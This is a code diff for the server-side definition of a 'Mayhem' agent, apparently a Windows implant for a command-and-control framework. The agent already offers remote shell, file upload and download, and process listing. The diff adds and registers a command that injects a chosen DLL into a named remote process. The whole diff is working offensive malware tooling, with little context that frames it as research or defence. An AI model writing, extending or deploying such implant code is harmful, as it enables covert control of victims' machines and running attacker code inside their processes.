@@ -17,6 +17,7 @@ COMMAND_UPLOAD         = 0x153
 COMMAND_DOWNLOAD       = 0x154
 COMMAND_EXIT           = 0x155
 COMMAND_PROCLIST       = 0x156
+COMMAND_INJECT_DLL     = 0x157
 
 class MayhemShell(Command):
     Name        = "shell"
@@ -86,6 +87,25 @@ class MayhemProcList(Command):
         packer.add_int(self.CommandId)
         return packer.get_buffer()
 
+class MayhemInjectDLL(Command):
+    Name        = "inject"
+    Description = "inject a DLL into a remote process"
+    Help        = "inject [process_name] [dll_path]"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = [
+        CommandParam("process_name", False, False),
+        CommandParam("dll_path", False, False),
+    ]
+    CommandId   = COMMAND_INJECT_DLL
+
+    def job_generate(self, arguments: dict) -> bytes:
+        packer = Packer()
+        packer.add_int(self.CommandId)
+        packer.add_data(arguments["process_name"])
+        packer.add_data(arguments["dll_path"])
+        return packer.get_buffer()
+
 class MayhemExit(Command):
     Name        = "exit"
     Description = "terminate the agent"
@@ -109,7 +129,7 @@ class Mayhem(AgentType):
     Arch = ["x64"]
     Formats = [{"Name": "Windows Executable", "Extension": "exe"}]
     BuildingConfig = {"Sleep": "10"}
-    Commands = [MayhemShell(), MayhemUpload(), MayhemDownload(), MayhemProcList(), MayhemExit()]
+    Commands = [MayhemShell(), MayhemUpload(), MayhemDownload(), MayhemProcList(), MayhemInjectDLL(), MayhemExit()]
 
     #builds the payload that the client requests. For example, if you select exe paylaod from ui, this builds the exe for you.
     def generate (self, config: dict) -> None:
